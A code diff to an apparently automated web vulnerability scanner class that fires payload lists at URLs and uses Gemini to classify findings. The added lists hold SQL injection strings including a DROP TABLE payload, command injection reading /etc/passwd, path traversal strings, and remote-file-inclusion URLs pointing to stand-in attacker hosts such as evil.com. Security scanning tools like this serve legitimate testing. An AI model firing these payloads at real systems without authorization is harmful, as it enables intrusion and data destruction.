@@ -13,6 +13,8 @@ import base64
 import hashlib
 import time
 from datetime import datetime
+import os
+from .browser_runtime import get_launch_options, extend_args, detect_lan_ip
 from typing import List, Dict, Optional, Tuple
 from dataclasses import dataclass
 import google.generativeai as genai
@@ -67,19 +69,27 @@ class MLVulnerabilityEngine:
             'sql_injection': {
                 'patterns': [
                     r"SQL syntax.*error",
-                    r"mysql_fetch_array",
+                    r"mysql_fetch_array\(\)",
+                    r"mysql_num_rows\(\)",
+                    r"You have an error in your SQL syntax",
+                    r"Warning.*mysql.*",
                     r"ORA-\d{5}",
                     r"Microsoft.*ODBC.*SQL",
                     r"PostgreSQL.*ERROR",
-                    r"Warning.*mysql_.*",
                     r"valid MySQL result",
-                    r"MySqlClient\."
+                    r"MySqlClient\.",
+                    r"Unclosed quotation mark",
+                    r"quoted string not properly terminated"
                 ],
                 'payloads': [
-                    "' OR '1'='1",
-                    "\" OR \"1\"=\"1",
-                    "' UNION SELECT NULL--",
-                    "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+                    "1' OR '1'='1' #",
+                    "1' OR 1=1 #",
+                    "1' UNION SELECT null,user(),database() #",
+                    "admin'--",
+                    "1'; DROP TABLE users; --",
+                    "1 OR 1=1 #",
+                    "1 UNION SELECT null,user(),database() #",
+                    "1' AND SLEEP(5) #"
                 ]
             },
             'xss': {
@@ -101,18 +111,87 @@ class MLVulnerabilityEngine:
             },
             'command_injection': {
                 'patterns': [
+                    r"uid=\d+\(.*\)",
+                    r"root:.*:/bin/bash",
+                    r"Directory of.*Volume",
                     r"sh: .*: command not found",
                     r"root:.*:0:0:",
                     r"/bin/.*: .*: not found",
                     r"FATAL.*ERROR.*password",
-                    r"stderr: .*Permission denied"
+                    r"stderr: .*Permission denied",
+                    r"bin/sh",
+                    r"cmd.exe"
                 ],
                 'payloads': [
                     "; id",
-                    "| whoami",
+                    "| whoami", 
                     "`pwd`",
                     "$(cat /etc/passwd)",
-                    "&& echo vulnerable"
+                    "&& echo vulnerable",
+                    "; uname -a",
+                    "| id"
+                ]
+            },
+            'lfi': {
+                'patterns': [
+                    r"root:x:0:0:",
+                    r"daemon:x:1:1:",
+                    r"bin:x:2:2:",
+                    r"\[boot loader\]",
+                    r"Unable to open.*stream",
+                    r"failed to open stream",
+                    r"include_path",
+                    r"No such file or directory",
+                    r"Permission denied"
+                ],
+                'payloads': [
+                    "../../../../etc/passwd",
+                    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+                    "/etc/passwd",
+                    "file:///etc/passwd",
+                    "....//....//....//etc/passwd",
+                    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+                ]
+            },
+            'rfi': {
+                'patterns': [
+                    r"allow_url_include",
+                    r"failed to open stream: HTTP request failed",
+                    r"Warning.*include.*",
+                    r"include_path.*failed"
+                ],
+                'payloads': [
+                    "http://evil.com/shell.txt",
+                    "https://pastebin.com/raw/evilcode",
+                    "ftp://attacker.com/shell.php"
+                ]
+            },
+            'csrf': {
+                'patterns': [
+                    r"CSRF.*token.*missing",
+                    r"Invalid.*token",
+                    r"Cross.*site.*request",
+                    r"Token.*mismatch"
+                ],
+                'payloads': [
+                    # CSRF testing requires form analysis, these are indicators
+                    "csrf_test=1",
+                    "token=invalid"
+                ]
+            },
+            'open_redirect': {
+                'patterns': [
+                    r"Location:.*http",
+                    r"window\.location",
+                    r"document\.location",
+                    r"header.*Location"
+                ],
+                'payloads': [
+                    "http://evil.com",
+                    "https://malicious.com",
+                    "//evil.com",
+                    "/\\evil.com",
+                    "javascript:alert('redirect')"
                 ]
             },
             'xxe': {
@@ -162,6 +241,7 @@ class MLVulnerabilityEngine:
         # Enhance findings with AI analysis if available
         if self.gemini_model and findings:
             enhanced_findings = await self._enhance_findings_with_ai(findings)
+            logger.info(f"🧠 ML Analysis Complete: {len(enhanced_findings)} vulnerabilities with ML intelligence")
             return enhanced_findings
         
         return findings
@@ -263,24 +343,27 @@ class MLVulnerabilityEngine:
         return findings
 
     def _select_target_vulnerabilities(self, tech_stack: str) -> List[str]:
-        """Select vulnerability types to test based on technology stack"""
-        # Base vulnerabilities to always test
-        base_vulns = ['xss', 'sql_injection']
+        """Select vulnerability types to test based on technology stack - UNIVERSAL approach"""
+        # Universal vulnerabilities to test on ALL targets
+        universal_vulns = [
+            'xss', 'sql_injection', 'command_injection', 'lfi', 'rfi', 
+            'csrf', 'open_redirect', 'ssrf'
+        ]
         
         tech_lower = tech_stack.lower()
         
-        # Add technology-specific vulnerabilities
-        if any(tech in tech_lower for tech in ['php', 'asp', 'jsp', 'python']):
-            base_vulns.append('command_injection')
-        
+        # Add specialized vulnerabilities based on detected technology
         if any(tech in tech_lower for tech in ['xml', 'soap', 'rest']):
-            base_vulns.append('xxe')
+            universal_vulns.append('xxe')
         
-        if any(tech in tech_lower for tech in ['api', 'microservice', 'cloud']):
-            base_vulns.append('ssrf')
+        if any(tech in tech_lower for tech in ['upload', 'file']):
+            universal_vulns.append('file_upload')
         
-        logger.debug(f"🎯 Target vulnerabilities for {tech_stack}: {base_vulns}")
-        return base_vulns
+        if any(tech in tech_lower for tech in ['api', 'json', 'graphql']):
+            universal_vulns.append('injection')
+        
+        logger.debug(f"🎯 Universal vulnerability testing for any target: {universal_vulns}")
+        return universal_vulns
 
     async def _test_payload(self, url: str, vuln_type: str, payload: str, session: aiohttp.ClientSession) -> Optional[MLVulnerabilityFinding]:
         """Test a specific payload against a URL"""
@@ -405,16 +488,26 @@ class MLVulnerabilityEngine:
         
         try:
             async with async_playwright() as playwright:
-                browser = await playwright.chromium.launch(headless=True)
+                opts = get_launch_options()
+                headless = bool(opts['headless'])
+                devtools = bool(opts['devtools'])
+                rdp_port = opts['rdp_port']
+                rdp_addr = opts['rdp_addr']
+
+                launch_args = extend_args([], get_launch_options()['args'])
+
+                browser = await playwright.chromium.launch(headless=headless, devtools=devtools, args=launch_args)
                 context = await browser.new_context()
                 page = await context.new_page()
+                if rdp_port:
+                    ip = detect_lan_ip()
+                    logger.info(f"🔎 DevTools listening: http://{ip}:{rdp_port}  (chrome://inspect -> Add target)")
                 
-                # Capture console messages
+                # Capture console messages and (optionally) network
                 console_messages = []
-                page.on("console", lambda msg: console_messages.append({
-                    'type': msg.type,
-                    'text': msg.text
-                }))
+                _net = []
+                from .browser_runtime import setup_observers as _setup
+                _setup(page, console_messages, _net, structured=True)
                 
                 # Set up dialog handler to detect alerts
                 dialog_detected = False
@@ -469,16 +562,30 @@ class MLVulnerabilityEngine:
             evidence['error'] = str(e)
             return False, evidence
 
+    
+
     def _calculate_pattern_confidence(self, pattern: str, response_text: str, tech_stack: str) -> float:
         """Calculate confidence score for pattern match"""
         base_confidence = 0.5
         
-        # Boost confidence for specific error patterns
+        # Universal high-confidence vulnerability patterns
         high_confidence_patterns = [
             r"SQL syntax.*error",
+            r"mysql_fetch_array\(\)",
+            r"mysql_num_rows\(\)",
+            r"You have an error in your SQL syntax",
             r"ORA-\d{5}",
-            r"root:.*:0:0:",
-            r"<script[^>]*>.*?</script>"
+            r"uid=\d+\(.*\)",
+            r"root:.*:/bin/bash",
+            r"root:x:0:0:",
+            r"daemon:x:1:1:",
+            r"Directory of.*Volume",
+            r"<script[^>]*>.*?</script>",
+            r"javascript:.*alert\(",
+            r"onerror=.*alert\(",
+            r"Unable to open.*stream",
+            r"failed to open stream",
+            r"include_path"
         ]
         
         for high_pattern in high_confidence_patterns:
@@ -511,6 +618,86 @@ class MLVulnerabilityEngine:
             tech_relevance = 0.2
         
         return min(base_score + tech_relevance, 1.0)
+
+    async def ai_validate_finding(self, finding: Dict) -> Optional[Dict]:
+        """AI validation using Gemini Flash with per-type prompts to reduce false positives.
+
+        Returns dict like { 'verdict': 'verified|reflected|benign', 'confidence': 0.0-1.0, 'reason': str }
+        or None if AI is unavailable.
+        """
+        try:
+            if not getattr(self, 'gemini_model', None):
+                return None
+            vt = (finding.get('vuln_type') or finding.get('type') or '').lower()
+            url = finding.get('url', '')
+            payload = finding.get('payload') or ''
+            evidence = finding.get('evidence') or ''
+            snippet = (evidence[:1000] if isinstance(evidence, str) else str(evidence)[:1000])
+            def _build_prompt(vtype: str) -> str:
+                header = (
+                    "You are a senior application security engineer. Classify this finding with zero tolerance for false "
+                    "positives. Use strict criteria for VERIFIED vs REFLECTED vs BENIGN. Provide reasons concisely.\n\n"
+                    f"Type: {vtype}\nURL: {url}\nPayload: {payload}\nEvidence: {snippet}\n\n"
+                )
+                if 'xss' in vtype:
+                    body = (
+                        "- VERIFIED only if JavaScript executed in browser context (dialog event, sentinel variable).\n"
+                        "- REFLECTED if payload appears without execution. BENIGN if likely false positive.\n"
+                    )
+                elif 'sql' in vtype:
+                    body = (
+                        "- VERIFIED if DB errors/leaks or proven UNION/boolean/time-based exploitation; REFLECTED if only echoed.\n"
+                    )
+                elif 'ssrf' in vtype:
+                    body = (
+                        "- VERIFIED if OOB callback observed or internal targets fetched; otherwise downrank.\n"
+                    )
+                elif 'inclusion' in vtype or 'lfi' in vtype:
+                    body = (
+                        "- VERIFIED if sensitive file signatures (/etc/passwd) or include errors confirm file handling.\n"
+                    )
+                elif 'command' in vtype and 'injection' in vtype:
+                    body = (
+                        "- VERIFIED if command output markers (uid=, whoami, echo markers) are present.\n"
+                    )
+                elif 'redirect' in vtype:
+                    body = (
+                        "- VERIFIED if 3xx Location header to attacker domain; REFLECTED if only link present.\n"
+                    )
+                else:
+                    body = (
+                        "- Only mark VERIFIED if exploit effect is demonstrated; otherwise REFLECTED or BENIGN.\n"
+                    )
+                tail = (
+                    "\nOutput strict JSON: {\"verdict\": \"verified|reflected|benign\", \"confidence\": 0..1, \"reason\": \"...\"}."
+                )
+                return header + body + tail
+            prompt = _build_prompt(vt)
+            import asyncio as _asyncio
+            def _call():
+                try:
+                    resp = self.gemini_model.generate_content(prompt)
+                    return resp.text if hasattr(resp, 'text') else str(resp)
+                except Exception as e:
+                    return f"ERROR: {e}"
+            raw = await _asyncio.to_thread(_call)
+            try:
+                import json as _json
+                text = (raw or '').strip()
+                start = text.find('{')
+                end = text.rfind('}')
+                if start != -1 and end != -1 and end > start:
+                    obj = _json.loads(text[start:end+1])
+                    verdict = str(obj.get('verdict', '')).lower()
+                    conf = float(obj.get('confidence', 0.0))
+                    reason = str(obj.get('reason', '')).strip()
+                    if verdict in ('verified','reflected','benign'):
+                        return {'verdict': verdict, 'confidence': max(0.0, min(1.0, conf)), 'reason': reason}
+            except Exception:
+                pass
+            return None
+        except Exception:
+            return None
 
     def _determine_severity(self, vuln_type: str, confidence: float) -> str:
         """Determine severity based on vulnerability type and confidence"""
@@ -611,7 +798,7 @@ class MLVulnerabilityEngine:
                     finding.ai_analysis = analysis.get('ai_analysis', 'AI analysis completed')
         
         except Exception as e:
-            logger.error(f"AI analysis failed: {e}")
+            logger.debug(f"AI analysis failed: {e}")
             # Set default values on error
             for finding in findings:
                 finding.exploitation_complexity = 'MEDIUM'
